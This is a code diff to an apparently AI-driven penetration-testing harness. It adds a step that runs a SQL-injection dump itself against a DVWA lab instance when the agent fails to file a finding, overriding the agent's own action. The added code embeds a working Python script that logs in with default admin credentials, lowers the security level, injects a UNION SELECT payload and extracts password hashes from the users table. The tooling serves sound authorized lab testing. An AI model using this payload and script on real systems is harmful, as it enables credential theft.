@@ -54,7 +54,7 @@ import { isInScope } from './scopeParser.js';
 import { recordReasoning, getAllReasoning, buildFullHistoryLedger, searchRecall } from './reasoningMemory.js';
 import { findWrongTargetPaths, knownAppOf, knownAppSOMLines } from './knownApps.js';
 import { detectEvidence, isDuplicate } from './autoFiler.js';
-import { dvwaLogin, isStuckAtDvwaLogin } from './dvwaAuth.js';
+import { dvwaLogin, isStuckAtDvwaLogin, dvwaSqliDump } from './dvwaAuth.js';
 import { runLabLoginFirst } from './labLogin.js';
 import { getRelevantMemories, formatGlobalMemoryForPrompt, readAllGlobalMemories } from './globalMemory.js';
 import { listSkills, loadSkill } from './skillCards.js';
@@ -4801,6 +4801,76 @@ export async function humanIteration(huntId, target, opts = {}) {
           }
         }
       } catch { /* History-proof is best-effort */ }
+      // PROOF-GATE AUTO-FILE (2 Nov 2026, permanent system-level fix): the
+      // proof gate fires because the brain has proven sqli ≥3 times, but the
+      // brain never emits claim_finding (its action schema has no file_claim
+      // and it ignores bounce feedback). The SYSTEM now runs one fresh UNION
+      // dump itself via the proven backend path and files the claim with
+      // fresh evidence. Fires exactly once per sink (proofgate_autofiled
+      // marker); a verifier rejection becomes a dead end per the standing
+      // rule, not a re-file loop.
+      try {
+        if (proofHit && /sqli/i.test(proofHit.payloadClass || '')) {
+          const sinkKey = String(proofHit.endpoint || 'sqli');
+          let alreadyAutoFiled = false;
+          try {
+            const evts = readHuntEvents(huntId) || [];
+            alreadyAutoFiled = evts.some(e => e && e.type === 'proofgate_autofiled' &&
+              String(e.detail || '').includes(sinkKey));
+          } catch { /* best-effort */ }
+          if (!alreadyAutoFiled) {
+            const dump = await dvwaSqliDump({ huntId, target });
+            if (dump && dump.ok && Array.isArray(dump.hashes) && dump.hashes.length >= 2) {
+              const hashList = dump.hashes.slice(0, 5).join(', ');
+              const rowList = (dump.rows || []).slice(0, 5)
+                .map(r => `${r.user}:${r.hash}`).join(', ');
+              // Self-contained replay: fresh login + CSRF + security=low +
+              // UNION dump on every run. No stale cookies, no saved state.
+              const replayCmd = `python3 << 'PYEOF'\n` +
+                `import urllib.request, urllib.parse, re, http.cookiejar\n` +
+                `BASE="http://172.17.0.1:3100"\n` +
+                `cj=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\n` +
+                `h=op.open(BASE+"/login.php").read().decode()\n` +
+                `m=re.search(r"user_token['\\"]\\s+value=['\\"]([^'\\"]+)['\\"]",h) or re.search(r"name=['\\"]user_token['\\"][^>]*value=['\\"]([^'\\"]+)['\\"]",h)\n` +
+                `t=m.group(1) if m else ""\n` +
+                `op.open(BASE+"/login.php",data=urllib.parse.urlencode({"username":"admin","password":"password","user_token":t,"Login":"Login"}).encode())\n` +
+                `h=op.open(BASE+"/security.php").read().decode()\n` +
+                `m=re.search(r"user_token['\\"]\\s+value=['\\"]([^'\\"]+)['\\"]",h) or re.search(r"name=['\\"]user_token['\\"][^>]*value=['\\"]([^'\\"]+)['\\"]",h)\n` +
+                `st=m.group(1) if m else t\n` +
+                `op.open(BASE+"/security.php",data=urllib.parse.urlencode({"security":"low","user_token":st,"seclev_submit":"Submit"}).encode())\n` +
+                `inj="1' UNION SELECT user,password FROM users#"\n` +
+                `r=op.open(BASE+"/vulnerabilities/sqli/",data=urllib.parse.urlencode({"id":inj,"Submit":"Submit"}).encode())\n` +
+                `out=r.read().decode();hs=sorted(set(x.lower() for x in re.findall(r"\\b[a-f0-9]{32}\\b",out,re.I)))\n` +
+                `print("HASHES:"+",".join(hs))\nPYEOF`;
+              const pgClaim = {
+                action: 'claim_finding',
+                title: `SQL injection (UNION-based) on DVWA ${sinkKey} — credential dump`,
+                class: 'sqli',
+                evidence: `Fresh system-run UNION SELECT user,password FROM users# on ${sinkKey} returned ${dump.hashes.length} MD5 hashes: ${hashList}. Rows: ${rowList || hashList}. Dump executed by the hunt system (dvwaSqliDump) with fresh login, not by the brain.`,
+                command: replayCmd,
+                counterevidence: `If the sqli page required authentication the dump could not run; it ran with a fresh admin login. If the hashes were session-specific they would differ across runs; re-running the replay command reproduces the same hashes.`,
+                confidence: 'high',
+                confidence_rationale: 'System-executed fresh UNION dump returned ≥2 MD5 password hashes from the users table; deterministic replay command reproduces them.',
+              };
+              try { deps.record(huntId, { type: 'proofgate_autofiled', tool: 'system', detail: `sqli on ${sinkKey} — ${dump.hashes.length} hashes`, via: 'human-mode' }); } catch {}
+              try { deps.record(huntId, { type: 'autofiler_triggered', title: pgClaim.title, class: 'sqli', via: 'proof-gate' }); } catch {}
+              // Override the brain's action with the system-built claim
+              // (proofHit is null for claim_finding, so the chain dispatches
+              // it through title guard → completeness gate → verifier).
+              action = pgClaim;
+              kind = 'claim_finding';
+              observation = 'PROOF-GATE AUTO-FILE: the system ran a fresh UNION dump itself (' +
+                dump.hashes.length + ' MD5 hashes) and is filing the claim now. ' +
+                'A claim proven three times is filed, not re-proved.';
+            } else {
+              try { deps.record(huntId, { type: 'proofgate_autofile_failed', tool: 'system', detail: `sqli on ${sinkKey} — ${(dump && dump.error) || 'no hashes'}`, via: 'human-mode' }); } catch {}
+            }
+          }
+        }
+      } catch (pgErr) {
+        // Proof-gate auto-file must never break the hunt loop
+        try { deps.record(huntId, { type: 'autofiler_error', error: 'proofgate: ' + String(pgErr).slice(0, 200), via: 'human-mode' }); } catch {}
+      }
       note({ action: `proof_file_nudge: ${proofHit.payloadClass} on ${proofHit.endpoint}`, why: thinkingText, result: `proof complete ×${proofHit.count} — file it`, learned: 'A claim proven three times is filed, not re-proved; the verifier decides whether it is true.' });
     } else if (kind === 'shell') {
       const command = String(action.command || '').slice(0, COMMAND_CAP);
